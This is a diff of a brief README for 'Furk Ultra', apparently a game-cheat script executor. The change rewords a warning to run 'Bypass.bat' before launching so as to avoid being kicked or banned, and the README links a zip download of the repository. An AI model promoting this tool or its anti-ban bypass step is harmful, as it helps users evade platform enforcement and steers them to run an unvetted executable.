@@ -1,8 +1,7 @@
 # Furk-Ultra
 Furk Ultra is a executor with a built in scripts
 
-  IMPORTANT: 
-  MAKE SURE YOU RUN BYPASS BEFORE RUNNING FURK ULTRA OR YOU WILL GET INSTANT BANNED
+# Important:  Make sure u run Bypass.bat before launching the Furk Ultra to prevent from getting kicked or banned
 
 If your struggling to download click [here](https://github.com/CdIkEXPLOIT/Furk-Ultra/archive/refs/heads/main.zip) to download
 
